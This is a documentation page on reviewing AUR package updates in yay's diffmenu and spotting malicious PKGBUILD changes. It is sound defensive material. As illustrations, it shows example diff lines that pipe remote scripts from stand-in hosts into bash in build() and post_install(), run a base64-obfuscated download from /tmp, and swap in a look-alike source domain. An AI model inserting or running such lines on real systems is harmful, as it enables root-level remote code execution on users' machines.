# Reviewing AUR Diffs

`arc update system` triages pending AUR updates before yay runs (see [platforms](platforms.md) for what gets flagged and where state lives), but the final call happens at yay's diffmenu, where you read the actual diff and decide whether to build. This doc covers how to drive that menu and, more importantly, how to tell a routine update from a malicious one.

## Driving yay's diffmenu

At `Diffs to show?`:

- `a` + Enter — show diffs for all packages
- `1`, `1 3`, `1-3` — show diffs for specific packages by number
- `^2` — all except package 2
- Enter alone — `[N]one`, which **skips the review entirely**; the capitalized option is the default, so reflexively pressing Enter here defeats the whole point

Diffs open in your `$PAGER` (usually `less`): `q` closes the current diff and advances to the next one (then back into yay's flow), `/` searches, `Ctrl-C` at any yay prompt aborts the run without installing anything. Packages being built for the first time have no previous version to diff against, so yay shows the full PKGBUILD — read it top to bottom once; future updates only need the diff.

### If you hate the pager

The raw `less` view is the default, not the only option:

- **Better pager, zero yay changes.** yay pipes diffs through `$YAYPAGER` (falling back to `$PAGER`), so `export YAYPAGER='delta --side-by-side'` in your shell rc gives syntax-highlighted, side-by-side diffs; `bat -l diff` works too. This is the biggest quality-of-life win for the least effort.
- **Read it in your editor instead.** Answer `N` to `Diffs to show?` and pick packages at the `PKGBUILDs to edit?` prompt instead — yay opens the files in `$EDITOR`. With `EDITOR='code --wait'` (or `nvim`), you review in a real editor and just close the window to continue. Note this shows the current files, not a diff.
- **Inspect the clone yourself.** yay keeps its checkouts in `~/.cache/yay/<pkgbase>/`, which is a plain git repo. From another terminal: `git -C ~/.cache/yay/cursor-bin log -p` — or point any git GUI/difftool at it.
- **Browse it on the web.** Every package's history is public cgit: `https://aur.archlinux.org/cgit/aur.git/log/?h=<pkgbase>` shows each commit as a clickable diff in your browser.

## What a normal update looks like

The overwhelming majority of diffs are version bumps. The tell is that everything moves *together* and nothing changes *shape*:

```diff
 pkgname=cursor-bin
-pkgver=3.7.36
+pkgver=3.15.19
 pkgrel=1
-_electron=electron39
+_electron=electron40
-_commit=776d1f9d76df50a4e0aeca61819a88e7c1b861e2
+_commit=de07bee81cefe43461ebf4f40c3d2d78d15052aa
 source=("https://downloads.cursor.com/production/${_commit}/linux/x64/deb/amd64/deb/cursor_${pkgver}_amd64.deb"
-sha512sums[0]=d06af53505b0cbfadf9ecfcf32590a60b21ff496171ecbcdaf2790bd0573...
+sha512sums[0]=77d98fdafef453c9b2e872929d1764b735dcdda71564bbd42a8ca2e2e97...
```

Benign changes you'll see constantly:

- `pkgver` / `pkgrel` bump with a matching checksum change — new source, new hash, always paired
- Pinned upstream identifiers moving with the version: commit hashes, build IDs, dependency version bumps (`electron39` → `electron40`)
- The `source=` URL *template* unchanged — only variables inside it (`${pkgver}`, `${_commit}`) resolve differently; the **host** stays the same
- Packaging housekeeping: new `depends`/`optdepends`, `makedepends` additions that match the upstream changelog, `.desktop`/icon fixes, `provides`/`conflicts` tweaks, comment and maintainer-header edits
- A `sha512sums=('SKIP' ...)` entry that is overridden a few lines later with a real hash (a common pattern for per-arch sources; arc's SKIP finding is Info-severity for exactly this reason)

## What a malicious diff looks like

Real AUR attacks (the 2018 `acroread` takeover, the 2024 typosquat wave) are surprisingly lazy — the payload is usually visible in the diff if anyone reads it. The patterns, roughly in order of how loud they scream:

**Source host changed.** The single strongest tell. The version bump is cover; the download now comes from somewhere else:

```diff
-source=("https://downloads.cursor.com/production/${_commit}/.../cursor_${pkgver}_amd64.deb"
+source=("https://cursor-releases.site/production/${_commit}/.../cursor_${pkgver}_amd64.deb"
```

Look-alike domains (`github.com.cdn-dl.net`), a maintainer's "mirror", or a raw pastebin/gist URL replacing the vendor's domain all count. arc flags this HIGH as URL host drift. A *added* mirror alongside the original is more often benign but still deserves a look.

**Checksum weakened instead of updated.** A hash replaced with `SKIP` (with no override), or `sha512sums` downgraded to `md5sums`, means the fetched source is no longer verified — combined with any URL change this is a payload delivery mechanism:

```diff
-sha512sums=('77d98fdafef453c9b2e872929d1764b...')
+sha512sums=('SKIP')
```

**A second download stage appears.** The PKGBUILD's checksums only cover `source=`. Anything fetched *during* the build is invisible to them:

```diff
 build() {
   cd "$pkgname-$pkgver"
+  curl -s https://api.telemetry-check.dev/init.sh | bash
   make
 }
```

Same category: a new `npm install` / `pip install` / `cargo install` of a package that isn't in the project's lockfile, or `git clone` of an unrelated repo. Note the legitimate version: many Electron/node packages have always run `npm ci` against a shipped lockfile — that's why arc flags *new* fetch lines and downgrades lockfile-pinned ones, rather than flagging every occurrence.

**Install-time hooks appear or grow.** `build()` runs in a build sandbox as your user, but `.install` functions and libalpm hooks run as **root on your machine** at install time. A new `install=` declaration, or a `post_install()` that gains network or persistence behavior, is a major escalation:

```diff
 post_install() {
   xdg-icon-resource forceupdate
+  curl -s https://x.example/s | bash
+  systemctl enable --now helper.timer
 }
```

**The payload hides outside the PKGBUILD.** AUR repos ship local files — patches, `foo.sh` helpers, `.desktop` files — that the PKGBUILD applies or installs. A diff that adds ten quiet lines to `fix-build.patch` while the PKGBUILD barely changes deserves as much attention as the PKGBUILD itself (this is why arc scans the whole snapshot, not just the PKGBUILD). New binary files in the repo are effectively unreviewable; treat them as hostile until explained.

**Obfuscation.** There is no honest reason for a PKGBUILD to contain `base64 -d`, `eval` on a constructed string, hex-escaped blobs, or variables assembled character-by-character. Packaging is boring; anything that makes the diff *harder to read* is itself the finding:

```diff
+_x=$(echo aHR0cHM6Ly9ldmlsLmV4YW1wbGUvcGF5bG9hZA== | base64 -d)
+curl -s "$_x" -o /tmp/.cache && chmod +x /tmp/.cache && /tmp/.cache
```

**Privilege and persistence touches.** `chmod +s` (setuid), writes to `/etc/systemd/`, `~/.bashrc`, `~/.config/autostart/`, cron entries, or `sudo` anywhere in build/install functions.

**Context multipliers.** None of the above in isolation proves malice, and their absence proves nothing — but arc's provenance findings tell you how suspicious to be: a maintainer change or orphan adoption right before the diff, one account taking over several packages at once, or a `pkgrel`-only bump (same upstream version, changed build) with unexplained file changes. A brand-new maintainer's first push deserves the paranoid reading; the fifth routine bump from a five-year maintainer usually doesn't.

## A 20-second checklist per diff

1. Did the source **host** change? (No → mostly fine already.)
2. Did checksums update *with* the version, or get weakened/SKIPped?
3. Any new network access in `prepare()`/`build()`/`package()`?
4. Any new or changed `.install`, hook, patch, or local script — and did you read those hunks too?
5. Does anything require effort to read? Obfuscation is a red flag by itself.
6. Cross-check arc's pre-yay findings: maintainer/adoption flags raise the bar for everything above.

When in doubt: `Ctrl-C`, nothing installs, and the package stays flagged — arc only commits its trusted baseline after a yay run succeeds, so a rejected diff shows up again in full on the next update.
